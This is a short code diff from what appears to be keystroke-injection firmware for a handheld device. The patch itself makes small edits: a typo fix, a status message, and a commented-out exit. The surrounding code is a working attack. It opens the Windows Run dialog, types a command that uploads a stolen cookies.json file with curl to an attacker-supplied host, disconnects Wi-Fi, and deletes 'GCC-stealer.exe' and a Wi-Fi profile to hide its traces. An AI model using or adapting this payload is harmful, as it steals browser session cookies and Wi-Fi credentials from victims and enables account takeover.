@@ -186,11 +186,10 @@ void run_payload_setup(){
   " && timeout /t 5" \
   " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
   " & netsh wlan disconnect" \
-  " & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & exit";
+  " & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml";// & exit";
 
   DISP.setTextColor(BGCOLOR, FGCOLOR);
-  DISP.println("Runing payload...");
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Running payload...");
   delay(2000);   
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -203,6 +202,7 @@ void run_payload_setup(){
   Keyboard.print(cmd);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
+  DISP.println("done.");
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.printf(TXT_SEL_BACK);
 }
